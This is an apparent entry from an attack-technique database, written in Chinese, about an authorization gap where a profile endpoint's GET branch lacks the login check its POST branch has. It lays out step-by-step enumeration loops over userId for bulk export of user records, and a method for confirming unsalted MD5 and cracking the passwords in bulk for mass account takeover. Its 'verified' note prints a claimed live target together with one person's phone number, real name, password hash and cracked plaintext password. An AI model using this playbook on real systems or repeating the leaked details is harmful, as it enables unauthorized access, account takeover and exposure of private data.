# GET/POST 分支鉴权不一致导致 userId 水平越权遍历（含无盐 MD5 口令泄露）

- **code**: get-post-分支鉴权不一致导致-userid-水平越权遍历-含无盐-md5-口令泄露
- **kind**: script
- **category**: unauthorized
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.124:34672 的 /user/getUserInfo 实测：GET ?userId=618189 未授权返回完整档案（手机号 16685191923、realName 情珑、password 68fe799d4e026cf483c5c5113789e2c0 = md5("sr19960823")）；同路径 POST 返回 errorCode 8005 请先登录。稀疏采样 172/240 命中、密集采样 1000/1000 命中。
- **tags**: 越权,IDOR,未授权访问,无盐MD5,主键遍历
- **created_at**: 2026-09-28T07:20:56.060Z
- **found_by**: vuln-scan

## 描述

通用手法：REST 接口同一路径的 GET/POST 分支鉴权不一致，导致 GET 分支可未授权遍历主键（userId）读取任意用户档案；配合无盐 MD5 口令可实现批量账户接管。前提：目标用整数自增/连续主键，且 GET 分支缺少登录校验（常见于 @GetMapping 方法未加拦截器、而 @PostMapping 加了）。

## 用法

```
① 对目标路径分别发 GET 与 POST，比较响应：若 GET 返回业务数据而 POST 返回「请先登录」类 8005/401，即命中鉴权分支不一致。
② 稀疏采样定位主键分布：`for uid in range(1, 1200001, 5000): GET /user/getUserInfo?userId={uid}`，统计命中率（实测 71.7%，id 连续分配）。
③ 受控密集采样导出（速率 ≤5 req/s、总量设上限）：`for uid in range(START, START+COUNT): GET ?userId={uid}`，落盘 JSON 并统计字段与口令可反查比例。
④ 口令字段为 32 位 hex 时先判定是否无盐 MD5：`md5(已知明文) == 返回哈希`，命中即证明无盐，可彩虹表批量反查。
参数名可通过服务端报错获取（Spring 会回显 `Required Long parameter 'userId' is not present`）。
```
